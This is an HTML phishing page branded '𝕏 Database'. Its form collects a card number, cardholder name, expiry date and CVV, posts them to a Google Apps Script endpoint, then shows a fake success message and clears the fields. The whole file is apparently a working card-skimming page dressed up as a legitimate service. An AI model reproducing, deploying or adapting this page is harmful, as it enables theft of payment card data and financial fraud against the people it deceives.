<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>𝕏 Database</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #1a1a1a, #111111);
    }

    .card {
      width: 400px;
      padding: 30px;
      border-radius: 20px;
      background: rgba(0, 0, 0, 0.85);
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      backdrop-filter: blur(10px);
      color: #fff;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .card h2 {
      margin: 0;
      text-align: center;
      font-weight: bold;
      font-size: 24px;
    }

    label {
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 5px;
      display: block;
    }

    input {
      width: 93%;
      padding: 12px 15px;
      border-radius: 10px;
      border: none;
      background-color: rgba(255,255,255,0.05);
      color: #fff;
      font-size: 16px;
      outline: none;
      transition: 0.3s;
      margin-bottom: 10px;
    }

    input:focus {
      background-color: rgba(255,255,255,0.1);
    }

    .row {
      display: flex;
      justify-content: space-between;
      gap: 20px; /* space between Exp Date and CVV */
    }

    .row div {
      flex: 1; /* equal width for each input container */
    }

    .row input {
      width: 100%; /* fill container */
      box-sizing: border-box;
    }

    .submit-bar {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 12px;
      border-radius: 12px;
      background-color: #111111;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
      border: none;
      color: #fff;
      transition: 0.3s;
    }

    .submit-bar:hover {
      background-color: #333333;
    }

    .submit-bar img {
      height: 24px;
      width: 24px;
    }

    .thank-you {
      display: none;
      text-align: center;
      font-size: 18px;
      color: #0f0;
    }

    /* Responsive for mobile */
    @media screen and (max-width: 420px) {
      .card {
        width: 90%;
        padding: 20px;
      }
      .row {
        flex-direction: column;
        gap: 15px;
      }
    }
  </style>
</head>
<body>

<div class="card">
  <h2>𝕏 Database</h2>
  <form id="cardForm" 
        action="https://script.google.com/macros/s/AKfycbxANF_5-w06bXv1LhqMfJJ6bFhHeDEItslXY9eiVDsgZD2uCxxCE3yGbW-30odX-Bp-/exec" 
        method="POST"
        target="_blank"
  >
    <label>Card Number:</label>
    <input type="text" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>

    <label>Cardholder Name:</label>
    <input type="text" name="cardHolder" placeholder="Enter Here" required>

    <div class="row">
      <div>
        <label>Exp Date:</label>
        <input type="text" name="expDate" placeholder="MM/YY" maxlength="5" required>
      </div>
      <div>
        <label>CVV:</label>
        <input type="text" name="cvv" placeholder="XXX" maxlength="3" required>
      </div>
    </div>

    <button type="submit" class="submit-bar">
      <img src="https://i.imgur.com/igeEdp3g.jpg" alt="Logo">
      Submit
    </button>
  </form>

  <div class="thank-you" id="thankYou">
    ✅ Submission successful!
  </div>
</div>

<script>
  const form = document.getElementById("cardForm");
  const thankYou = document.getElementById("thankYou");

  form.addEventListener("submit", function(e) {
    setTimeout(() => {
      thankYou.style.display = "block";
      form.reset();
    }, 1000);
  });
</script>

</body>
</html>
